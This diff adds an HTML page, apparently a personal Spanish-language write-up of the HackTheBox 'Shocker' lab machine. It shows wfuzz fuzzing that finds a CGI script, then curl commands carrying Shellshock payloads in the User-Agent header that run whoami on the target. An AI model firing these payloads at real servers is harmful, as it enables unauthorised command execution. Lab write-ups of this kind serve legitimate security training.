@@ -1,0 +1,67 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Shocker HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/shocker/pasted-20251103194750.png" alt="Shocker HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Shocker</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>linux</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Fuzzing web hasta descubrir <code>/cgi-bin/user.sh</code></li>
+            <li><code>Explotación</code>: Shellshock mediante cabecera User-Agent para ejecutar comandos</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/shocker/pasted-20251103204940.png" alt="Shocker HTB" />
+          <div class="code-card">
+            <h3>Fuzzing Web</h3>
+            <pre><code># Rutas
+wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://shocker/FUZZ
+# Directorios: /cgi-bin
+
+# Extensiones vulnerables a shellshock
+wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,sh-pl-cgi http://shocker/cgi-bin/FUZZ.FUZ2Z
+# Archivo: user.sh</code></pre>
+          </div>
+          <p>Ruta: <code>http://shocked/cgi-bin/user.sh</code></p>
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: ShellShock Attack (Burpsuite)</h2>
+          <img class="writeup-image" src="/writeups/assets/shocker/pasted-20251104002257.png" alt="Shocker HTB" />
+          <div class="code-card">
+            <h3>ShellShock con Curl</h3>
+            <pre><code>curl -s "http://shocker/cgi-bin/user.sh" -H "User-Agent: () { :; }; /usr/bin/whoami"
+curl -s "http://shocker/cgi-bin/user.sh" -H "User-Agent: () { :; };echo; /usr/bin/whoami"
+curl -s "http://shocker/cgi-bin/user.sh" -H "User-Agent: () { :; };echo;echo; /usr/bin/whoami"</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>linux</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
